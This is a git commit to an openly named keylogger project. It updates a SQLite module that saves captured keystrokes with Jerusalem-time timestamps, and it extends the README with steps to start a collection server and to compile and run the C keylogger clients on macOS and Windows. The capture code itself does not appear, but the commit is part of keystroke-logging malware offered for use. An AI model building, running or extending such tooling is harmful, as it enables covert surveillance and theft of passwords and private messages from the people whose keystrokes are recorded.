c06ebd33396c5a0c8f1ea21a11f6059602e1fbb7
firasabs <firasabosada@gmail.com>
2024-10-10 15:21:17 +0300

    update Database.py, jeruslem local time

--- Database.py
+++ Database.py
@@ -1,9 +1,11 @@
 import sqlite3
-def connect_db(): #create or connect to db
+from datetime import datetime, timedelta
+
+def connect_db():  # create or connect to db
     conn = sqlite3.connect('keylog.db')
     return conn
 
-#Create the keystrokes table (if not exists)
+# Create the keystrokes table (if not exists)
 def create_table(conn):
     cursor = conn.cursor()
     cursor.execute('''
@@ -15,21 +17,22 @@ def create_table(conn):
     ''')
     conn.commit()
 
-#Insert keys (data) into the database
+# Insert keys (data) into the database
 def save_keystroke(conn, key):
     cursor = conn.cursor()
-    cursor.execute("INSERT INTO keystrokes (key) VALUES (?)", (key,))
-    conn.commit()
-    """
-# Function to fetch and display all stored keystrokes
-def get_all_keystrokes(conn):
-    cursor = conn.cursor()
-    cursor.execute("SELECT * FROM keystrokes")
-    rows = cursor.fetchall()  # Fetch all rows from the table
+    
+    # Get the current time in UTC and convert it to Jerusalim local time (UTC+3)
+    utc_now = datetime.utcnow()  # Get current UTC time
+    local_offset = timedelta(hours=3)  # Israel is UTC+3
+    local_time = utc_now + local_offset  # Adjust to local time
+    
+    # Format the local time to only include hours, minutes, and seconds
+    formatted_time = local_time.strftime("%Y-%m-%d %H:%M:%S")
 
-    for row in rows:
-        print(row)  # Print each row (ID, timestamp, key)
-        """
-#Close the database connection
+    # Insert key and local timestamp into the database
+    cursor.execute("INSERT INTO keystrokes (timestamp, key) VALUES (?, ?)", (formatted_time, key))
+    conn.commit()
+
+# Close the database connection
 def close_db(conn):
     conn.close()
--- README.md
+++ README.md
@@ -1,6 +1,11 @@
 # keyLogger
+mac:
 1. start python Server:
     python3 Server.py
 2. Run the C Client (Keylogger): Compile and run the C keylogger on your mac:
     gcc -o keyloggermac keyloggermac.c -framework ApplicationServices -framework Carbon -framework CoreServices
     ./keyloggermac
+windows:
+1. python3 Server.py
+2. Run the C Client (Keylogger):
+  (optinal in command line): gcc -o keyloggerwin keyloggerwin.c
